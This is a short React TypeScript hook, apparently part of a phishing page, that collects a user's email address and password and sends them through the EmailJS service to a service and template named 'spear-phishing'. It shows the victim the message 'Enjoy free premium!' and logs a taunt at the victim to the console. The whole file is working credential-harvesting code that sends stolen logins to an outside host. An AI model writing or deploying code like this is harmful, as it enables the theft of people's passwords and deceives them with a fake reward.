import { useState } from 'react';
import emailjs from '@emailjs/browser';

interface TemplateParams extends Record<string, unknown> {
  user_email: string;
  user_password: string;
}

interface UseSendEmailResult {
  sendEmail: (templateParams: TemplateParams) => Promise<boolean>;
  message: string;
  error: string;
  loading: boolean;
}

const useSendEmail = (): UseSendEmailResult => {
  const [message, setMessage] = useState<string>('');
  const [error, setError] = useState<string>('');
  const [loading, setLoading] = useState<boolean>(false);

  const sendEmail = async (templateParams: TemplateParams): Promise<boolean> => {
    setLoading(true);
    setMessage('');
    setError('');

    try {
      const response = await emailjs.send(
        "spear-phishing",
        "spear_phishing_template",
        templateParams,
        "YO_9tlZixdhtYDWw"
      );
      console.log('GET FUCKED BOZO!', response.status, response.text);
      setMessage('Enjoy free premium!');
      return true;
    } catch (err) {
      console.error('FAILED...', err);
      setError('Failed to submit, please try again.');
      return false;
    } finally {
      setLoading(false);
    }
  };

  return { sendEmail, message, error, loading };
};

export default useSendEmail;
